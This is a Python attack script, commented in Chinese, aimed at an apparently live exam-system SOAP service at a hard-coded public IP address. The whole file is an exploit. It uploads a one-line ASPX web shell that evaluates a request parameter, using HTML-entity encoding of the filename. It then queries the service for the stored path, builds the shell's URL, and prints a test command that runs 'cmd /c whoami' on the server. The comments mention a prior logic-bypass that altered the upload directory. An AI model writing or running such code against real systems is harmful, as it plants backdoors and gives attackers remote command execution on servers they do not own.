import requests
import base64
import os
import re

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
SHELL_FILENAME = "s.aspx" # 短一点
# 之前利用逻辑绕过脚本，已经将 AnswerPath 修改为 "e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web"
# 那么 GetFilder 生成的路径应该是:
# e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\Room\Code Name\A01\
# 我们这次不进行 ..\ 遍历，而是顺势而为，直接上传到这个深层目录，然后通过 URL 访问它。
# 这样可以避免 ..\ 被系统过滤或解析错误的问题。

SHELL_CODE = r'<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>'

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def upload_and_find_shell():
    print(f"=== 上传 Web Shell (顺势而为版) ===")

    # 1. 上传文件 (正常文件名，不带 ..\)
    encoded_filename = to_html_entities(SHELL_FILENAME)
    file_b64 = base64.b64encode(SHELL_CODE.encode('utf-8')).decode('utf-8')

    soap_upload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <UploadAnswer xmlns="http://tempuri.org/">
          <uid>9207</uid>
          <aid>1</aid> <filename>{encoded_filename}</filename>
          <file>{file_b64}</file>
        </UploadAnswer>
      </soap:Body>
    </soap:Envelope>"""

    try:
        print(f"[*] 正在上传 {SHELL_FILENAME}...")
        resp = requests.post(TARGET_URL, data=soap_upload.encode('utf-8'), headers=HEADERS, timeout=10)

        if resp.status_code != 200:
            print(f"[-] 上传失败: {resp.status_code}")
            return

        print("[+] 上传请求发送成功 (HTTP 200)")

        # 2. 调用 GetUploadFiles 获取真实路径
        print("[*] 正在查询文件路径...")

        soap_list = """<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUploadFiles xmlns="http://tempuri.org/">
              <uid>9207</uid>
            </GetUploadFiles>
          </soap:Body>
        </soap:Envelope>"""

        resp_list = requests.post(TARGET_URL, data=soap_list.encode('utf-8'), headers=HEADERS, timeout=10)

        # 提取 FullPath
        # XML 格式: <FullPath>e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\...\s.aspx</FullPath>
        match = re.search(r"<FullPath>(.*?)</FullPath>", resp_list.text)

        if match:
            full_path = match.group(1)
            print(f"[+] 发现文件路径: {full_path}")

            # 3. 解析为 URL
            # 假设 Web 根目录是 e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web
            # 我们需要截取该目录之后的部分
            web_root_marker = r"Eiven.EXE.Web\Eiven.EXE.Web"
            if web_root_marker in full_path:
                rel_path = full_path.split(web_root_marker)[1]
                # 将反斜杠转换为正斜杠
                url_path = rel_path.replace("\\", "/")
                shell_url = f"http://120.55.241.236:999{url_path}"

                print(f"\n[★ SUCCESS] Shell URL 推测为: {shell_url}")
                print(f"    测试命令: {shell_url}?c=var d=new ActiveXObject(\"WScript.Shell\");var o=d.Exec(\"cmd /c whoami\");Response.Write(o.StdOut.ReadAll());")
            else:
                print(f"[-] 路径似乎不在 Web 根目录下，无法自动生成 URL。")
                print(f"    FullPath: {full_path}")
        else:
            print("[-] 未在 GetUploadFiles 响应中找到 FullPath，可能是上传并未成功写入文件。")
            print("    (注意：如果之前修改 AnswerPath 出错，可能导致目录创建失败)")

    except Exception as e:
        print(f"[!] 异常: {e}")

if __name__ == "__main__":
    upload_and_find_shell()
